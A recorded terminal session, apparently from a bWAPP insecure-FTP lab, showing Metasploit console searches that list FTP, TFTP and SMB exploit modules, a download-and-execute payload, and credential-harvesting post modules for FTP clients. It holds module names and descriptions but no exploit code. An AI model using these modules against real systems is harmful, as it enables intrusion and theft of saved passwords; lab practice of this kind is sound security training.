+   187  exploit/windows/smb/ms08_067_netapi                                 2008-10-28       [32mgreat[0m      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+   188  exploit/windows/smb/ms17_010_eternalblue                            2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   189  exploit/windows/smb/ms17_010_eternalblue_win8                       2017-03-14       average    No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   190  exploit/windows/ssh/free[45mftp[0md_key_exchange                           2006-05-12       average    No     Free[45mFTP[0md 1.0.10 Key Exchange Algorithm String Buffer Overflow
+   191  exploit/windows/t[45m[45mftp[0m[0m/att[45m[45mftp[0m[0m_long_filename                           2006-11-27       average    No     Allied Telesyn T[45mFTP[0m Server 1.9 Long Filename Overflow
+   192  exploit/windows/t[45m[45mftp[0m[0m/distinct_t[45m[45mftp[0m[0m_traversal                        2012-04-08       [32mexcellent[0m  No     Distinct T[45mFTP[0m 3.10 Writable Directory Traversal Execution
+   193  exploit/windows/t[45mftp[0m/dlink_long_filename                            2007-03-12       good       No     D-Link T[45mFTP[0m 1.0 Long Filename Buffer Overflow
+   194  exploit/windows/t[45mftp[0m/futuresoft_transfermode                        2005-05-31       average    No     FutureSoft T[45mFTP[0m Server 2000 Transfer-Mode Overflow
+   195  exploit/windows/t[45m[45mftp[0m[0m/netdecision_t[45m[45mftp[0m[0m_traversal                     2009-05-16       [32mexcellent[0m  No     NetDecision 4.2 T[45mFTP[0m Writable Directory Traversal Execution
+   196  exploit/windows/t[45m[45mftp[0m[0m/opent[45m[45mftp[0m[0m_error_code                            2008-07-05       average    No     OpenT[45mFTP[0m SP 1.4 Error Packet Overflow
+   197  exploit/windows/t[45m[45mftp[0m[0m/quick_t[45m[45mftp[0m[0m_pro_mode                            2008-03-27       good       No     Quick [45mFTP[0m Pro 2.1 Transfer-Mode Overflow
+   198  exploit/windows/t[45m[45mftp[0m[0m/t[45m[45mftp[0m[0md32_long_filename                          2002-11-19       average    No     T[45mFTP[0mD32 Long Filename Buffer Overflow
+   199  exploit/windows/t[45m[45mftp[0m[0m/t[45m[45mftp[0m[0mdwin_long_filename                         2006-09-21       [32mgreat[0m      No     T[45mFTP[0mDWIN v0.4.2 Long Filename Buffer Overflow
+   200  exploit/windows/t[45m[45mftp[0m[0m/t[45m[45mftp[0m[0mserver_wrq_bof                             2008-03-26       normal     No     T[45mFTP[0m Server for Windows 1.4 ST WRQ Buffer Overflow
+   201  exploit/windows/t[45m[45mftp[0m[0m/threect[45m[45mftp[0m[0msvc_long_mode                        2006-11-27       [32mgreat[0m      No     3CT[45mftp[0mSvc T[45mFTP[0m Long Mode Buffer Overflow
+   202  payload/windows/download_exec                                                        normal     No     Windows Executable Download (http,https,[45mftp[0m) and Execute
+   203  post/multi/gather/filezilla_client_cred                                              normal     No     Multi Gather FileZilla [45mFTP[0m Client Credential Collection
+   204  post/multi/gather/netrc_creds                                                        normal     No     UNIX Gather .netrc Credentials
+   205  post/windows/gather/credentials/bulletproof_[45mftp[0m                                      normal     No     Windows Gather BulletProof [45mFTP[0m Client Saved Password Extraction
+   206  post/windows/gather/credentials/core[45mftp[0m                                              normal     No     Windows Gather Core[45mFTP[0m Saved Password Extraction
+   207  post/windows/gather/credentials/filezilla_server                                     normal     No     Windows Gather FileZilla [45mFTP[0m Server Credential Collection
+   208  post/windows/gather/credentials/flashfxp                                             normal     No     Windows Gather FlashFXP Saved Password Extraction
+   209  post/windows/gather/credentials/[45mftp[0mnavigator                                         normal     No     Windows Gather [45mFTP[0m Navigator Saved Password Extraction
+   210  post/windows/gather/credentials/[45mftp[0mx                                                 normal     No     Windows Gather [45m[45mFTP[0m[0m Explorer ([45m[45mFTP[0m[0mX) Credential Extraction
+   211  post/windows/gather/credentials/idm                                                  normal     No     Windows Gather Internet Download Manager (IDM) Password Extractor
+   212  post/windows/gather/credentials/smart[45mftp[0m                                             normal     No     Windows Gather Smart[45mFTP[0m Saved Password Extraction
+   213  post/windows/gather/credentials/total_commander                                      normal     No     Windows Gather Total Commander Saved Password Extraction
+   214  post/windows/gather/credentials/ws[45mftp[0m_client                                         normal     No     Windows Gather WS_[45mFTP[0m Saved Password Extraction
+   215  post/windows/manage/pxeexploit                                                       normal     No     Windows Manage PXE Exploit Server
+
+
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> search anon ftp[Pftp+ftp
+[0m[1m[31m[-][0m No results from search
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> search anon+ftp[Pftp[Pftp[Pftp[Pftp[Pftp[C[C[C platform:lionux[Pnux
+[0m
+Matching Modules
+================
+
+   #   Name                                                               Disclosure Date  Rank       Check  Description
+   -   ----                                                               ---------------  ----       -----  -----------
+   0   exploit/linux/[45m[45mftp[0m[0m/pro[45m[45mftp[0m[0m_sreplace                                  2006-11-26       [32mgreat[0m      Yes    Pro[45mFTP[0mD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   1   exploit/linux/[45m[45mftp[0m[0m/pro[45m[45mftp[0m[0m_telnet_iac                                2010-11-01       [32mgreat[0m      Yes    Pro[45mFTP[0mD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
+   2   exploit/linux/http/cisco_prime_inf_rce                             2018-10-04       [32mexcellent[0m  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   3   exploit/linux/http/linksys_wrt160nv2_apply_exec                    2013-02-11       [32mexcellent[0m  No     Linksys WRT160nv2 apply.cgi Remote Command Injection
+   4   exploit/linux/local/servu_[45mftp[0m_server_prepareinstallation_priv_esc  2019-06-05       [32mexcellent[0m  Yes    Serv-U [45mFTP[0m Server prepareinstallation Privilege Escalation
+   5   exploit/linux/misc/netsupport_manager_agent                        2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
+   6   exploit/linux/snmp/awind_snmp_exec                                 2019-03-27       [32mexcellent[0m  Yes    AwindInc SNMP Service Command Injection
+   7   exploit/multi/[45m[45mftp[0m[0m/pure[45m[45mftp[0m[0md_bash_env_exec                           2014-09-24       [32mexcellent[0m  Yes    Pure-[45mFTP[0md External Authentication Bash Environment Variable Code Injection (Shellshock)
+   8   exploit/multi/[45m[45mftp[0m[0m/wu[45m[45mftp[0m[0md_site_exec_format                          2000-06-22       [32mgreat[0m      Yes    WU-[45mFTP[0mD SITE EXEC/INDEX Format String Vulnerability
+   9   exploit/multi/wyse/hagent_untrusted_hsdata                         2009-07-10       [32mexcellent[0m  No     Wyse Rapport Hagent Fake Hserver Command Execution
+   10  post/multi/gather/filezilla_client_cred                                             normal     No     Multi Gather FileZilla [45mFTP[0m Client Credential Collection
+   11  post/multi/gather/netrc_creds                                                       normal     No     UNIX Gather .netrc Credentials
+
+
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> search ftp platform:linuxInterrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> Interrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> [0m]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ exit
+
+Script done on 2020-08-18 03:07:44+05:30 [COMMAND_EXIT_CODE="0"]
